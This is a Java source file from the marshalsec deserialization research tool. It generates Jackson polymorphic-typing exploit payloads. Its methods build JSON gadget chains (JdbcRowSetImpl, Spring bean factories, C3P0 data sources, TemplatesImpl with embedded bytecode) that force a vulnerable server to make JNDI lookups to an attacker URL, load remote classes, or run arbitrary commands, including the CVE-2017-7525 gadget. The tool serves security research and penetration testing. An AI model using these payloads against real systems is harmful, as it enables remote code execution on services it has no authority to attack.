/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import java.util.Base64;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.config.PropertyPathFactoryBean;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.sun.rowset.JdbcRowSetImpl;

import marshalsec.gadgets.Args;
import marshalsec.gadgets.C3P0RefDataSource;
import marshalsec.gadgets.C3P0WrapperConnPool;
import marshalsec.gadgets.JdbcRowSet;
import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
import marshalsec.gadgets.SpringPropertyPathFactory;
import marshalsec.gadgets.Templates;
import marshalsec.gadgets.TemplatesUtil;
import marshalsec.gadgets.UnicastRemoteObjectGadget;
import marshalsec.util.Reflections;


/**
 * @author mbechler
 *
 */
public class Jackson extends MarshallerBase<String> implements JdbcRowSet, SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor,
        C3P0RefDataSource, C3P0WrapperConnPool, UnicastRemoteObjectGadget, Templates {

    /**
     * {@inheritDoc}
     *
     * @see marshalsec.MarshallerBase#marshal(java.lang.Object)
     */
    @Override
    public String marshal ( Object o ) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        return mapper.writeValueAsString(o);
    }


    /**
     * {@inheritDoc}
     *
     * @see marshalsec.MarshallerBase#unmarshal(java.lang.Object)
     */
    @Override
    public Object unmarshal ( String data ) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        return mapper.readValue(data, Object.class);
    }


    @Override
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    }, noTest = true ) // not totally reliable and only for >= 2.7.0
    public Object makeJdbcRowSet ( UtilFactory uf, String[] args ) throws Exception {
        Map<String, String> values = new LinkedHashMap<>();
        values.put("dataSourceName", quoteString(args[ 0 ]));
        values.put("autoCommit", "true");
        return writeObject(JdbcRowSetImpl.class, values);
    }


    @Override
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makePropertyPathFactory ( UtilFactory uf, String[] args ) throws Exception {
        Map<String, String> values = new LinkedHashMap<>();
        String jndiUrl = args[ 0 ];
        values.put("targetBeanName", quoteString(jndiUrl));
        values.put("propertyPath", quoteString("foo"));
        values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
        return writeObject(PropertyPathFactoryBean.class, values);
    }


    @Override
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
        String jndiUrl = args[ 0 ];
        Map<String, String> values = new LinkedHashMap<>();
        values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
        values.put("adviceBeanName", quoteString(jndiUrl));
        return writeCollection(
            HashSet.class.getName(),
            writeObject(DefaultBeanFactoryPointcutAdvisor.class, values),
            writeObject(DefaultBeanFactoryPointcutAdvisor.class, Collections.EMPTY_MAP));
    }


    private static String makeSpringJndiBeanFactory ( String jndiUrl ) {
        return writeObject(SimpleJndiBeanFactory.class, Collections.singletonMap("shareableResources", writeArray(quoteString(jndiUrl))));
    }


    @Override
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makeRefDataSource ( UtilFactory uf, String[] args ) throws Exception {
        Map<String, String> values = new LinkedHashMap<>();
        values.put("jndiName", quoteString(args[ 0 ]));
        values.put("loginTimeout", "0");
        return writeObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", values);
    }


    @Override
    @Args ( minArgs = 2, args = {
        "codebase", "class"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    public Object makeWrapperConnPool ( UtilFactory uf, String[] args ) throws Exception {
        return writeObject(
            WrapperConnectionPoolDataSource.class,
            Collections.singletonMap("userOverridesAsString", quoteString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]))));
    }


    @Override
    @Args ( minArgs = 0, args = {}, noTest = true ) // random port only
    public Object makeUnicastRemoteObject ( UtilFactory uf, String... args ) throws Exception {
        return writeObject("java.rmi.server.UnicastRemoteObject", Collections.EMPTY_MAP);
    }


    @Override
    @Args ( minArgs = 1, args = {
        "cmd", "args..."
    }, defaultArgs = {
        MarshallerBase.defaultExecutable
    }, noTest = true ) // this should only work with < JDK 8u45 OR if upstream xalan is present (set upstreamXalan=true)
    // this is likely the original gadget reported for Jackson bug #1599
    // also described by https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/
    public Object makeTemplates ( UtilFactory uf, String... args ) throws Exception {
        Object tpl = TemplatesUtil.createTemplatesImpl(args);
        byte[][] bytecodes = (byte[][]) Reflections.getFieldValue(tpl, "_bytecodes");
        Map<String, String> values = new LinkedHashMap<>();
        String base64 = Base64.getEncoder().encodeToString(bytecodes[ 0 ]);
        values.put("transletBytecodes", writeArray(quoteString(base64)));
        values.put("transletName", quoteString("foo"));
        values.put("outputProperties", "{}");
        if ( Boolean.parseBoolean(System.getProperty("upstreamXalan", "false")) ) {
            return writeObject("org.apache.xalan.xsltc.trax.TemplatesImpl", values);
        }
        return writeObject("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", values);
    }


    /**
     * @param quoteString
     * @return
     */
    private static String writeArray ( String... elements ) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        boolean first = true;
        for ( String elem : elements ) {
            if ( !first ) {
                sb.append(',');
            }
            else {
                first = false;
            }
            sb.append(elem);
        }
        sb.append(']');
        return sb.toString();
    }


    /**
     * @param string
     * @return
     */
    private static String quoteString ( String string ) {
        return '"' + string + '"';
    }


    private static String writeCollection ( String type, String... values ) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        sb.append('"').append(type).append('"');
        sb.append(',');
        sb.append('[');
        boolean first = true;
        for ( String val : values ) {
            if ( !first ) {
                sb.append(',');
            }
            else {
                first = false;
            }
            sb.append(val);
        }
        sb.append(']');
        sb.append(']');
        return sb.toString();
    }


    private static String writeObject ( Class<?> clazz, Map<String, String> values ) {
        return writeObject(clazz.getName(), values);
    }


    private static String writeObject ( String type, Map<String, String> properties ) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        sb.append('"').append(type).append('"');
        sb.append(',');
        sb.append('{');
        boolean first = true;
        for ( Entry<String, String> e : properties.entrySet() ) {
            if ( !first ) {
                sb.append(',');
            }
            else {
                first = false;
            }
            writeProperty(sb, e.getKey(), e.getValue());
        }
        sb.append('}');
        sb.append(']');
        return sb.toString();
    }


    /**
     * @param sb
     * @param key
     * @param value
     */
    private static void writeProperty ( StringBuilder sb, String key, String value ) {
        sb.append('"').append(key).append('"');
        sb.append(':');
        sb.append(value);
    }


    public static void main ( String[] args ) {
        new Jackson().run(args);
    }
}
